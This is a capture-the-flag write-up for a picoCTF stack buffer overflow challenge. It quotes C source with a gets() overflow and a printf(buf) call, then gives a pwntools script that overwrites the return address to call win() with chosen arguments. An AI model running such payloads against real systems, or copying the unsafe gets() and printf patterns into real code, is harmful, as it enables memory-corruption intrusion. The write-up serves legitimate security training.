# Description

Control the return address and arguments

```c
// same as the previous challenge.
void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}
```

We have to overwrite the arguments to the values "0xCAFEF00D" && "0xF00DF00D" to get the flag:

```c
void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xCAFEF00D)
    return;
  if (arg2 != 0xF00DF00D)
    return;
  printf(buf);
}
```
Check vuln.c,

so the exploit will be like:
```python
from pwn import *

r = remote('saturn.picoctf.net', 60850)
#p = process('./buffer_overflow2')

r.recvuntil("Please enter your string:")

win_addr = p32(0x08049296)
payload = cyclic(112) + win_addr + cyclic(4) + p32(0xCAFEF00D) + p32(0xF00DF00D)

r.sendline(payload)
print r.recvall()
```
